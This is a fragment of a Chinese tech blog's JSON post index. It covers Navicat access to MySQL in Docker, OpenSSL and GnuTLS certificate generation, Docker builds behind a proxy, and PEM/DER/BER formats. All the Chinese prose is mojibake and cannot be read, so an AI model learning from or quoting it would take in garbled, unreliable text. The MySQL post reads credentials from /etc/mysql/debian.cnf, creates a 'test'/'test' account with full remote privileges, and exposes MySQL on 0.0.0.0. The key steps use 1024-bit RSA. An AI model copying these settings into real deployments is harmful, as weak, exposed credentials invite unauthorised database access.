https://www.sizaif.com/tags/OpenSSL/"},{"name":"WolfSSL","slug":"WolfSSL","permalink":"https://www.sizaif.com/tags/WolfSSL/"}],"author":"sizaif"},{"title":"æœ¬åœ°Navicatè¿æ¥æœ¬åœ°dockerå®¹å™¨ä¸­mysql","slug":"æœ¬åœ°navicatè¿æ¥æœ¬åœ°dockerå®¹å™¨ä¸­mysql","date":"2021-08-10T06:04:59.000Z","updated":"2021-09-19T10:15:32.553Z","comments":true,"path":"posts/35862d23/","link":"","permalink":"https://www.sizaif.com/posts/35862d23/","excerpt":"","text":"æœ¬åœ°navicatè¿æ¥æœ¬åœ°dockerå®¹å™¨ä¸­mysql ğŸ˜„ @Auther by sizaif ğŸ“† 2021-06-24 17:54:18 [TOC] ä¿®è®¢å†å² 2021-06-24 17:54:31: é¦–æ¬¡ç¼–è¾‘ 2021-06-24 22:28:18: update bug å…·ä½“æ­¥éª¤ å¦‚æœå·²ç»æœ‰äº†mysqlé•œåƒ, ç›´æ¥è·³è¿‡,åˆ°docker mysqlå®¹å™¨ä¸­ docker æ‹‰å» mysql é•œåƒ $ docker pull mysql å¯åŠ¨MySQLé•œåƒ $ docker run --name=mysql -itd -p &lt;å®¿ä¸»æœºæ˜ å°„ç«¯å£>:3306 -e MYSQL_ROOT_PASSWORD=&lt;å¯†ç > mysql è¿›å…¥MySQLå®¹å™¨ $ docker exec -it mysql /bin/bash è¿›å…¥MySQL è®¾ç½®å…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ· $ mysql -uroot -p&lt;å¯†ç > # è®¾ç½®å…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ·: 'test' hostç›‘å¬åœ°å€:'%' å¯†ç  test $ mysql> CREATE USER If Not Exists 'test'@'%' IDENTIFIED WITH mysql_native_password BY 'test'; # èµ‹äºˆç”¨æˆ·æƒé™ $ mysql> GRANT all privileges ON test.* TO 'test'@'%' identified by 'test'; # åˆ·æ–° $ mysql>flush privileges; ä¿®æ”¹mysqlé…ç½®ï¼Œå…è®¸ä»»æ„ä¸»æœºè®¿é—® # ä¿®æ”¹ mysqld.cnfä¸­ bind-addressç›‘å¬åœ°å€loaclhstä¸º0.0.0.0 $ sed -i 's/^bind-address.*$/bind-address=0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf # é‡å¯mysql $ service mysql restart è‹¥å«Œè¿›å…¥mysqlå¤ªéº»çƒ¦ç›´æ¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤,æ›¿æ¢æ‰&lt;&gt;ä¸­å†…å®¹ #ä¿®æ”¹mysqlé…ç½®ï¼Œå…è®¸ä»»æ„ä¸»æœºè®¿é—® $ sed -i 's/^bind-address.*$/bind-address=0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf $ service mysql restart # æ–°å»ºå…è®¸å¤–éƒ¨ç™»å½•çš„mysqlç”¨æˆ·ï¼š'&lt;test>'@'%'ï¼Œå¯†ç &lt;test> USER=`cat /etc/mysql/debian.cnf |grep user|head -1|awk '&#123;print $3&#125;'` PW=`cat /etc/mysql/debian.cnf |grep password|head -1|awk '&#123;print $3&#125;'` mysql -u$&#123;USER&#125; -p$&#123;PW&#125; -e\"CREATE USER If Not Exists '&lt;test>'@'%' IDENTIFIED WITH mysql_native_password BY '&lt;test>';\" mysql -u$&#123;USER&#125; -p$&#123;PW&#125; -e\"GRANT all privileges ON &lt;your mysql continer name>.* TO '&lt;test>'@'%' identified by '&lt;test>';flush privileges;\" navicat è¿œç¨‹è¿æ¥ ç„¶åè¿œç¨‹è¿æ¥ã€å®¿ä¸»æœºip:&lt;å®¿ä¸»æœºæ˜ å°„ç«¯å£&gt;ã€‘ï¼Œä½¿ç”¨æ–°å»ºçš„ç”¨æˆ·ç™»å½•mysqlå³å¯ã€‚ >$ docker run --name=mysql -itd -p &lt;å®¿ä¸»æœºæ˜ å°„ç«¯å£>:3306 -e MYSQL_ROOT_PASSWORD=&lt;å¯†ç > mysql é—®é¢˜å‘ç°æ•´ç† æŠ¥2013é”™è¯¯ è¿™ä¸ªåŸå› ä¸€èˆ¬æ˜¯ç”±mysqlä¸­å·²ç»è®¾å®šç”¨æˆ·çš„è¿œç¨‹hostä¸ºâ€™%',ä½†æ˜¯mysqld.cnf æˆ– my.cnfä¸­ bind-address ç›‘å¬åœ°å€ä¸ºlocalhostå¯¼è‡´ æŠ¥1045é”™è¯¯ Access defined ä¸€èˆ¬æ˜¯ç”±äºå¯†ç ä¸æ­£ç¡®æˆ–ç”¨æˆ·ä¸æ­£ç¡®å¯¼è‡´","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"},{"name":"Mysql","slug":"æŠ€æœ¯å‘/Mysql","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mysql/"}],"tags":[{"name":"æ•™ç¨‹","slug":"æ•™ç¨‹","permalink":"https://www.sizaif.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.sizaif.com/tags/Mysql/"}],"author":"sizaif"},{"title":"ç”ŸæˆOpenssl && Gnutls  Keys","slug":"ç”Ÿæˆopenssl-gnutls-keys","date":"2021-08-10T06:03:30.000Z","updated":"2021-08-14T14:15:24.753Z","comments":true,"path":"posts/bb0d4a87/","link":"","permalink":"https://www.sizaif.com/posts/bb0d4a87/","excerpt":"","text":"ç”Ÿæˆopenssl &amp;&amp; gnutls keys ğŸ˜„ @by sizaif ğŸ“† 2021-05-17 20:36:00 [TOC] Openssl ä»£ç  # Generate DH parameters openssl dhparam -outform PEM -out dhparams.pem -5 2048 # Generate CA key and certificate CA.pl or CA.sh /usr/lib/ssl/misc/CA.pl -newca # Generate server key and certificate openssl req -newkey rsa:1024 -nodes -keyout server.key -out server.req openssl ca -out server.crt -infiles server.req # Generate client key and certificate openssl req -newkey rsa:1024 -nodes -keyout client.key -out client.req openssl ca -out client.crt -infiles client.req # Generate client DH key and certificate openssl genpkey -paramfile dhparams.pem -out client_dh.key openssl pkey -in client_dh.key -pubout -out client_dh.pub #~/SSL/openssl/openssl-1.0.2/apps/openssl x509 -req -in client.req -CAkey demoCA/private/cakey.pem -CA demoCA/cacert.pem -force_pubkey client_dh.pub -out client_dh.crt -CAcreateserial -extensions v3_req -extfile ./openssl.cnf # Get keys in Java keystore # è¿™é‡Œè®¾ç½®æœåŠ¡ç«¯ çš„åç§°ä¸º server å¯†ç ä¸º changeit openssl pkcs12 -export -in server.crt -inkey server.key -out server.p12 -name server -CAfile ca.crt -caname root keytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore keystore -srckeystore server.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias server # è¿™é‡Œè®¾ç½®å®¢æˆ·ç«¯ çš„åç§°ä¸º client å¯†ç ä¸º changeit openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -name client -CAfile ca.crt -caname root keytool -importkeystore -srckeystore client.p12 -destkeystore keystore -srcstoretype PKCS12 -srcstorepass changeit -deststorepass changeit -destkeypass changeit -alias client #openssl pkcs12 -export -in client_dh.crt -inkey client_dh.key -out client_dh.p12 -name clientdh -CAfile ca.crt -caname root #keytool -importkeystore -deststorepass changeit -destkeypass changeit -destkeystore keystore -srckeystore client_dh.p12 -srcstoretype PKCS12 -srcstorepass changeit -alias clientdh # Get keys in Netscape keystore certutil -N -d . certutil -A -n ca -i demoCA/cacert.pem -d . -t TC certutil -A -n server -i server.crt -d . -t P pk12util -d . -i server.p12 certutil -A -n client1 -i client.crt -d . -t P pk12util -d . -i client.p12 GnuTLS code #ç”ŸæˆCAç§é’¥ certtool --generate-privkey > x509-ca-key.pem # åˆ›å»ºCAæ¨¡ç‰ˆ vim ca.tmpl cn = \"GnuTLS test CA\" organization = \"TLSTest\" serial = 1 expiration_days = 3650 ca signing_key cert_signing_key crl_signing_key #ç”ŸæˆCAè¯ä¹¦ certtool --generate-self-signed --load-privkey x509-ca-key.pem --template ca.tmpl --outfile x509-ca.pem #ç”ŸæˆServerç§é’¥ certtool --generate-privkey > x509-server-key.pem #åˆ›å»ºServerè¯ä¹¦æ¨¡ç‰ˆ vim server.tmpl cn = \"GnuTLS test server\" organization = \"TLSTest\" expiration_days = 3650 signing_key encryption_key tls_www_server #ç”ŸæˆServerè¯ä¹¦ certtool --generate-certificate --load-privkey x509-server-key.pem \\ --load-ca-certificate x509-ca.pem --load-ca-privkey x509-ca-key.pem \\ --template server.tmpl --outfile x509-server.pem #ç”ŸæˆClientç§é’¥ certtool --generate-privkey > x509-client-key.pem #åˆ›å»ºClientè¯ä¹¦æ¨¡ç‰ˆ vim client.tmpl cn = GnuTLS test client tls_www_client encryption_key signing_key tls_www_client #ç”ŸæˆClientè¯ä¹¦ certtool --generate-certificate --load-privkey x509-client-key.pem \\ --load-ca-certificate x509-ca.pem --load-ca-privkey x509-ca-key.pem \\ --template client.tmpl --outfile x509-client.pem #è½¬æ¢ä¸ºp12è¯ä¹¦ ä»¥åŠjava keystore ;Get keys in Java keystore # è¿™é‡Œè®¾ç½®çš„åç§°ä¸º client # å¯†ç ä¸º123456 certtool --to-p12 --load-ca-certificate x509-ca.pem \\ --load-privkey x509-client-key.pem --load-certificate x509-client.pem \\ --outder --outfile x509-client.p12 keytool -importkeystore -srckeystore x509-client.p12 -destkeystore keystore -srcstoretype PKCS12 -srcstorepass 123456 -deststorepass 123456 -alias client # è¿™é‡Œè®¾ç½®çš„åç§°ä¸º server # å¯†ç ä¸º123456 certtool --to-p12 --load-ca-certificate x509-ca.pem \\ --load-privkey x509-server-key.pem --load-certificate x509-server.pem \\ --outder --outfile x509-server.p12 keytool -importkeystore -srckeystore x509-server.p12 -destkeystore keystore -srcstoretype PKCS12 -srcstorepass 123456 -deststorepass 123456 -alias server","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"GnuTLS","slug":"GnuTLS","permalink":"https://www.sizaif.com/tags/GnuTLS/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"}],"author":"sizaif"},{"title":"ä½¿ç”¨ä»£ç†è¿›è¡Œ Docker Build é—®é¢˜çš„è§£å†³æ€è·¯","slug":"ä½¿ç”¨ä»£ç†è¿›è¡Œ-docker-build-é—®é¢˜çš„è§£å†³æ€è·¯","date":"2021-08-10T06:01:12.000Z","updated":"2021-09-19T10:15:19.803Z","comments":true,"path":"posts/d4ac1b81/","link":"","permalink":"https://www.sizaif.com/posts/d4ac1b81/","excerpt":"","text":"ä½¿ç”¨ä»£ç†è¿›è¡Œ docker build é—®é¢˜çš„è§£å†³æ€è·¯ ğŸ˜„ @Auther: sizaif ğŸ“† 2021-06-10 00:03:14 ğŸ” è½¬è½½è‡³: åŸæ–‡ä½œè€…: simpleapples åŸæ–‡é“¾æ¥: http://www.simpleapples.com/2019/04/18/building-docker-image-behind-proxy/ è®¸å¯åè®®: çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨ 4.0 å›½é™…è®¸å¯åè®® [TOC] é—®é¢˜æè¿° åœ¨ä½¿ç”¨ docker build æ‰“åŒ…é•œåƒæ—¶ï¼Œé‡åˆ°äº†éœ€è¦ä½¿ç”¨ä»£ç†è®¿é—®ç½‘ç»œçš„éœ€æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹çš„ Dockerfile æ¥æ¨¡æ‹Ÿè¿™ä¸ªåœºæ™¯ï¼š FROM golang:1.12 RUN curl www.google.com --max-time 3 å›½å†…ä¸€èˆ¬ç½‘ç»œç¯å¢ƒä¸‹ï¼Œcurl www.google.com æ˜¯æ— æ³•æ­£å¸¸è¿”å›çš„ï¼ŒåŠ å…¥ â€“max-time è®© curl çš„è€—æ—¶ä¸è¦å¤ªé•¿ã€‚ é…ç½® http_proxy å˜é‡ é¦–å…ˆéœ€è¦åœ¨ç¯å¢ƒå˜é‡ä¸­è®¾ç½® http_proxy å’Œ https_proxyï¼Œä½¿å¾—è®¿é—®ç½‘ç»œçš„å‘½ä»¤ï¼ˆè¿™é‡Œä½¿ç”¨ curl æ¥ä»£è¡¨ï¼‰èƒ½å¤Ÿé€šè¿‡ç¯å¢ƒå˜é‡ä¸­é…ç½®çš„ä»£ç†æœåŠ¡å™¨è®¿é—® www.google.comã€‚ docker build å‘½ä»¤è™½ç„¶æ˜¯åœ¨ docker æ‰€åœ¨çš„å®¿ä¸»æœºä¸Šæ‰§è¡Œçš„ï¼Œçœ‹ä¸Šå»åƒæ˜¯ç›´æ¥ä½¿ç”¨äº†å®¿ä¸»æœºçš„ç½‘ç»œç¯å¢ƒï¼Œä½†å®é™…ä¸Šdocker build ä¹Ÿæ˜¯å¯åŠ¨äº†ä¸€ä¸ªcontainerè¿›è¡Œæ„å»ºï¼Œæ‰€ä»¥åœ¨æ„å»ºè¿‡ç¨‹ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½æ˜¯åœ¨ container ä¸­æ‰§è¡Œçš„ï¼Œhttp_proxy å’Œ https_proxy çš„é…ç½®ä¹Ÿåº”è¯¥æ˜¯åœ¨ container ä¸­è¿›è¡Œçš„ã€‚å¯ä»¥ä½¿ç”¨ ENV æ¥é…ç½® container ä¸­çš„ç¯å¢ƒå˜é‡ã€‚ ä»£ç†æœåŠ¡å™¨å¯åŠ¨åœ¨å®¿ä¸»æœºçš„ 1087 ç«¯å£ä¸Šï¼Œä¿®æ”¹ dockerfile æ–‡ä»¶ï¼š FROM golang:1.12 ENV http_proxy \"http://127.0.0.1:1087\" ENV HTTP_PROXY \"http://127.0.0.1:1087\" ENV https_proxy \"http://127.0.0.1:1087\" ENV HTTPS_PROXY \"http://127.0.0.1:1087\" RUN curl www.google.com --max-time 3 é‡æ–°æ‰§è¡Œ docker build ä¼šå‘ç° curl ä¾æ—§æ— æ³•è®¿é—® www.google.comï¼Œä»æŠ¥é”™ä¿¡æ¯ä¸Šå¯ä»¥çœ‹åˆ° 127.0.0.1 ä¸Šçš„ 1087 ç«¯å£ä¸Šå¹¶æ²¡æœ‰æœåŠ¡ã€‚ è®¿é—®å®¿ä¸»æœº ç”±äº container é»˜è®¤æ˜¯æ¡¥æ¥ç½‘ç»œï¼Œå®¿ä¸»æœºå’Œ container æ˜¯å¹³çº§çš„ï¼Œè¢«æ”¾åœ¨äº†ä¸€ä¸ªè™šæ‹Ÿçš„ç½‘æ®µé‡Œã€‚è®¿é—®å®¿ä¸»æœºä¸Šçš„ä»£ç†æœåŠ¡å™¨ï¼Œå¯¹äº container æ¥è¯´å®é™…ä¸Šæ˜¯è®¿é—®å¦ä¸€å°æœºå™¨ä¸Šçš„æœåŠ¡å™¨ï¼Œ127.0.0.1 æŒ‡å‘çš„æ˜¯ container æœ¬èº«ã€‚åœ¨ docker é»˜è®¤çš„æ¡¥æ¥ç½‘ç»œä¸­ï¼Œå®¿ä¸»æœºçš„ IP ä¸€èˆ¬æ˜¯ 172.17.0.1ï¼ˆLinuxï¼‰ï¼Œæˆ–è€… 192.168.65.1ï¼ˆMacOSï¼‰ï¼Œå¯ä»¥å°† http_proxy ä¸­çš„ IP æ¢æˆ 172.17.0.1/192.168.65.1ï¼Œæ¥å®ç°é€šè¿‡å®¿ä¸»çš„ä»£ç†æœåŠ¡å™¨è®¿é—®ç½‘ç»œï¼Œä¿®æ”¹ dockerfileï¼š FROM golang:1.12 ENV http_proxy \"http://172.17.0.1:1087\" ENV HTTP_PROXY \"http://172.17.0.1:1087\" ENV https_proxy \"http://172.17.0.1:1087\" ENV HTTPS_PROXY \"http://172.17.0.1:1087\" RUN curl www.google.com --max-time 3 è™½ç„¶ä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥è¾¾åˆ°ç›®çš„ï¼Œä½†æ˜¯å¦‚æœç¼–è¯‘ç¯å¢ƒå˜äº†æˆ–è€…ä»£ç†æœåŠ¡å™¨çš„é…ç½®å˜äº†ï¼Œå“ªæ€•åªæ˜¯æ“ä½œç³»ç»Ÿä» Linux å˜æˆäº† MacOSï¼Œéƒ½å¾—ä¿®æ”¹ dockerfileï¼Œæ˜¾ç„¶ä¸å¤Ÿè§£è€¦ï¼Œä¹Ÿä¸æ–¹ä¾¿ã€‚ é…ç½®ç½‘ç»œæ¨¡å¼ docker ä¸­è¿˜æœ‰ä¸€ç§ host ç½‘ç»œæ¨¡å¼ï¼Œå°±æ˜¯è®© container ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œï¼Œç›¸å½“äº container åœ¨ç½‘ç»œå±‚é¢å’Œå®¿ä¸»æœºä¸åšéš”ç¦»ï¼Œä½¿ç”¨è¿™ç§ç½‘ç»œæ¨¡å¼æ‰§è¡Œ docker buildï¼Œå°±ä¸éœ€è¦åœ¨ dockerfile ä¸­æ·»åŠ  http_proxy ç¯å¢ƒå˜é‡ï¼Œcontainer å¯ä»¥ç›´æ¥è¯»å–å®¿ä¸»ä¸Šçš„ç¯å¢ƒå˜é‡ã€‚ é¦–å…ˆåœ¨å®¿ä¸»ä¸Šå¯¼å…¥ http_proxy ç¯å¢ƒå˜é‡ï¼š export http_proxy=\"http://127.0.0.1:7890\" export HTTP_PROXY=\"http://127.0.0.1:7890\" export https_proxy=\"http://127.0.0.1:7890\" export HTTPS_PROXY=\"http://127.0.0.1:7890\" æ¥ä¸‹æ¥å°† dockerfile ç®€åŒ–ï¼š FROM golang:1.12 RUN curl www.google.com --max-time 3 é‡æ–°æ‰§è¡Œ docker buildï¼ŒåŠ ä¸Šå‚æ•° â€“network hostï¼Œä½¿ç”¨å®¿ä¸»ç½‘ç»œï¼š docker build --network host . æ‰§è¡Œå curl å°±å¯ä»¥åƒåœ¨å®¿ä¸»ä¸Šç›´æ¥æ‰§è¡Œä¸€æ ·ï¼Œé€šè¿‡ä»£ç†è®¿é—® www.google.com äº†ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"è¯ä¹¦é—´çš„é“é“æ²¹","slug":"è¯ä¹¦é—´çš„é“é“æ²¹","date":"2021-08-10T05:57:13.000Z","updated":"2021-08-14T14:15:24.757Z","comments":true,"path":"posts/b495581d/","link":"","permalink":"https://www.sizaif.com/posts/b495581d/","excerpt":"","text":"è¯ä¹¦é—´çš„é“é“æ²¹ ğŸ˜„ @auther sizaif ğŸ“† 2021-05-20 17:29:05 [TOC] ä»€ä¹ˆæ˜¯PEMæ–‡ä»¶æ ¼å¼ ( Privacy-Enhanced Mail) æ˜¯ä¸€ç§äº‹å®ä¸Šçš„æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå­˜å‚¨å’Œå‘é€åŠ å¯†å¯†é’¥ã€è¯ä¹¦å’Œå…¶ä»–æ•°æ®ï¼ŒåŸºäºä¸€ç»„å®šä¹‰â€œå¢å¼ºéšç§çš„é‚®ä»¶â€çš„1993 IETFæ ‡å‡† è®¸å¤šå¯†ç å­¦æ ‡å‡†ä½¿ç”¨ASN.1æ¥å®šä¹‰å®ƒä»¬çš„æ•°æ®ç»“æ„ï¼Œå¹¶ä½¿ç”¨åŒºåˆ†ç¼–ç è§„åˆ™**(Distinguished Encoding Rules, DER)**æ¥åºåˆ—åŒ–è¿™äº›ç»“æ„,å› ä¸ºDERäº§ç”ŸäºŒè¿›åˆ¶è¾“å‡ºï¼Œæ‰€ä»¥é€šè¿‡åªæ”¯æŒASCIIçš„ç³»ç»Ÿ(å¦‚ç”µå­é‚®ä»¶)ä¼ è¾“ç»“æœæ–‡ä»¶å¯èƒ½å¾ˆå›°éš¾ã€‚ PEMæ ¼å¼é€šè¿‡ä½¿ç”¨base64å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚PEMè¿˜å®šä¹‰äº†ä¸€è¡Œé¡µçœ‰ï¼ŒåŒ…æ‹¬â€œ-----BEGINâ€ã€ä¸€ä¸ªæ ‡ç­¾å’Œâ€œ-----â€;ä¸€è¡Œé¡µè„šï¼ŒåŒ…æ‹¬â€œ-----ENDâ€ã€ä¸€ä¸ªæ ‡ç­¾å’Œâ€œ-----â€ã€‚æ ‡ç­¾å†³å®šäº†ç¼–ç çš„æ¶ˆæ¯ç±»å‹ã€‚å¸¸ç”¨æ ‡ç­¾æœ‰â€œCERTIFICATEâ€ã€â€œCERTIFICATE REQUESTâ€ã€â€œPRIVATE KEYâ€ã€â€œX509 CRLâ€ç­‰ã€‚ PEMæ•°æ®é€šå¸¸å­˜å‚¨åœ¨åç¼€ä¸ºâ€œ .pemâ€ï¼Œåç¼€ä¸ºâ€œ .cerâ€æˆ–â€œ .crtâ€ï¼ˆç”¨äºè¯ä¹¦ï¼‰æˆ–åç¼€â€œ .keyâ€ï¼ˆç”¨äºå…¬é’¥æˆ–ç§é’¥ï¼‰çš„æ–‡ä»¶ä¸­ã€‚[3] PEMæ–‡ä»¶ä¸­çš„æ ‡ç­¾æ¯”æ–‡ä»¶åç¼€æ›´å‡†ç¡®åœ°è¡¨ç¤ºæ•°æ®ç±»å‹ï¼Œå› ä¸ºå¯ä»¥å°†è®¸å¤šä¸åŒç±»å‹çš„æ•°æ®ä¿å­˜åœ¨â€œ .pemâ€æ–‡ä»¶ä¸­ã€‚ ä»€ä¹ˆæ˜¯X.690 X.690æ˜¯ä¸€ä¸ªITU-Tæ ‡å‡†ï¼ŒæŒ‡å®šäº†å‡ ç§ASN.1ç¼–ç æ ¼å¼: Basic Encoding Rules (BER) Canonical Encoding Rules (CER) Distinguished Encoding Rules (DER) å‚è€ƒé“¾æ¥: https://en.wikipedia.org/wiki/X.690#DER_encoding BER encoding åŸºæœ¬ç¼–ç è§„åˆ™çš„æ ¼å¼æŒ‡å®šç¼–ç ASN.1æ•°æ®ç»“æ„çš„è‡ªæè¿°å’Œè‡ªå®šç•Œæ ¼å¼ã€‚æ¯ä¸ªæ•°æ®å…ƒç´ éƒ½è¢«ç¼–ç ä¸ºç±»å‹æ ‡è¯†ç¬¦ã€é•¿åº¦æè¿°ã€å®é™…æ•°æ®å…ƒç´ ä»¥åŠå¿…è¦æ—¶çš„å†…å®¹ç»“æŸæ ‡è®°ã€‚è¿™äº›ç¼–ç ç±»å‹é€šå¸¸ç§°ä¸ºç±»å‹-é•¿åº¦-å€¼æˆ–TLVç¼–ç ã€‚è¿™ç§æ ¼å¼å…è®¸æ¥æ”¶æ–¹ä»ä¸å®Œæ•´çš„æµä¸­è§£ç ASN.1ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦ä»»ä½•å…³äºæ•°æ®çš„å¤§å°ã€å†…å®¹æˆ–è¯­ä¹‰çš„é¢„å…ˆçŸ¥è¯† DER encoding DER (Distinguished Encoding Rules) æ˜¯BERçš„ä¸€ä¸ªå—é™å˜ä½“ï¼Œç”¨äºä¸ºASN.1æè¿°çš„æ•°æ®ç»“æ„äº§ç”Ÿæ˜ç¡®çš„ä¼ è¾“è¯­æ³•ã€‚åƒCER, DERç¼–ç æ˜¯æœ‰æ•ˆçš„BERç¼–ç ã€‚é™¤ä¸€ä¸ªå‘é€è€…çš„é€‰é¡¹å¤–ï¼ŒDERä¸BERæ˜¯ä¸€æ ·çš„ã€‚ DERæ˜¯BERçš„å­é›†ï¼Œæä¾›äº†ä¸€ç§å¯¹ASN.1å€¼è¿›è¡Œç¼–ç çš„æ–¹æ³•ã€‚DERé€‚ç”¨äºéœ€è¦å”¯ä¸€ç¼–ç çš„æƒ…å†µï¼Œä¾‹å¦‚åœ¨å¯†ç å­¦ä¸­ï¼Œå¹¶ç¡®ä¿éœ€è¦è¿›è¡Œæ•°å­—ç­¾åçš„æ•°æ®ç»“æ„äº§ç”Ÿå”¯ä¸€çš„åºåˆ—åŒ–è¡¨ç¤ºã€‚DERå¯ä»¥è¢«è®¤ä¸ºæ˜¯è¯¯ç ç‡çš„æ ‡å‡†å½¢å¼ã€‚ä¾‹å¦‚ï¼Œåœ¨BERä¸­ï¼Œä¸€ä¸ªå¸ƒå°”å€¼trueå¯ä»¥è¢«ç¼–ç ä¸º255ä¸ªéé›¶å­—èŠ‚å€¼ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œè€Œåœ¨DERä¸­ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å°†å¸ƒå°”å€¼trueç¼–ç ã€‚ æœ€é‡è¦çš„DERç¼–ç çº¦æŸæ˜¯: é•¿åº¦ç¼–ç å¿…é¡»ä½¿ç”¨ç¡®å®šçš„å½¢å¼ â€‹ æ­¤å¤–ï¼Œå¿…é¡»ä½¿ç”¨å°½å¯èƒ½çŸ­çš„é•¿åº¦ç¼–ç  ä½å­—ç¬¦ä¸²ã€å…«å­—èŠ‚å­—ç¬¦ä¸²å’Œå—é™å­—ç¬¦ä¸²å¿…é¡»ä½¿ç”¨åŸå§‹ç¼–ç  Setä¸­çš„å…ƒç´ æ ¹æ®æ ‡è®°å€¼æŒ‰æ’åºé¡ºåºè¿›è¡Œç¼–ç  DERå¹¿æ³›ç”¨äºX.509ç­‰æ•°å­—è¯ä¹¦ã€‚ CER encoding CER(è§„èŒƒç¼–ç è§„åˆ™)æ˜¯BERçš„ä¸€ç§å—é™å˜ä½“ï¼Œç”¨äºä¸ºASN.1æè¿°çš„æ•°æ®ç»“æ„ç”Ÿæˆæ˜ç¡®çš„ä¼ è¾“è¯­æ³•ã€‚BERæä¾›äº†å¯¹æ•°æ®å€¼å¦‚ä½•ç¼–ç çš„é€‰æ‹©ï¼Œè€ŒCER(è¿åŒDER)åªä»åŸºæœ¬ç¼–ç è§„åˆ™å…è®¸çš„ç¼–ç ä¸­é€‰æ‹©ä¸€ç§ç¼–ç ï¼Œæ¶ˆé™¤äº†å…¶ä»–é€‰é¡¹ã€‚å½“å¿…é¡»ä¿ç•™ç¼–ç æ—¶ï¼ŒCERæ˜¯æœ‰ç”¨çš„;ä¾‹å¦‚ï¼Œåœ¨è¯åˆ¸äº¤æ˜“ä¸­ BERã€CERã€DERæ¯”è¾ƒ BERæ ¼å¼å’ŒCERæˆ–DERæ ¼å¼ä¹‹é—´çš„å…³é”®åŒºåˆ«æ˜¯åŸºæœ¬ç¼–ç è§„åˆ™æä¾›çš„çµæ´»æ€§ BERï¼Œå¦‚ä¸Šæ‰€è¿°ï¼Œæ˜¯ITU-T X.690ç»™å‡ºçš„ç”¨äºASN.1æ•°æ®ç»“æ„ä¼ è¾“çš„ç¼–ç è§„åˆ™çš„åŸºæœ¬é›†åˆã€‚å®ƒä¸ºå‘é€æ–¹æƒ³è¦å‘é€çš„æ•°æ®ç»“æ„æä¾›äº†æ˜ç¡®çš„ç¼–ç è§„åˆ™ï¼Œä½†ä¹Ÿç»™å‘é€æ–¹ç•™ä¸‹äº†ä¸€äº›ç¼–ç é€‰æ‹©.æ­£å¦‚X.690æ ‡å‡†ä¸­æ‰€è¿°ï¼Œâ€œä½œä¸ºå‘é€æ–¹çš„é€‰é¡¹ï¼ŒåŸºæœ¬ç¼–ç è§„åˆ™å…è®¸æ›¿ä»£ç¼–ç ã€‚â€å£°ç§°ç¬¦åˆåŸºæœ¬ç¼–ç è§„åˆ™çš„æ¥æ”¶æ–¹åº”æ”¯æŒæ‰€æœ‰æ›¿ä»£æ–¹æ¡ˆâ€ æ¥æ”¶æ–¹å¿…é¡»å‡†å¤‡å¥½æ¥å—æ‰€æœ‰åˆæ³•ç¼–ç ï¼Œæ‰èƒ½åˆæ³•å£°æ˜BER-compliance,ç›¸æ¯”ä¹‹ä¸‹ï¼ŒCERå’ŒDERéƒ½å°†å¯ç”¨é•¿åº¦è§„èŒƒé™åˆ¶ä¸ºå•ä¸ªé€‰é¡¹ã€‚å› æ­¤ï¼ŒCERå’ŒDERæ˜¯è¯¯ç ç‡çš„é™åˆ¶å½¢å¼ï¼Œç”¨äºæ¶ˆé™¤è¯¯ç ç‡æ ‡å‡†çš„æ­§ä¹‰ã€‚ 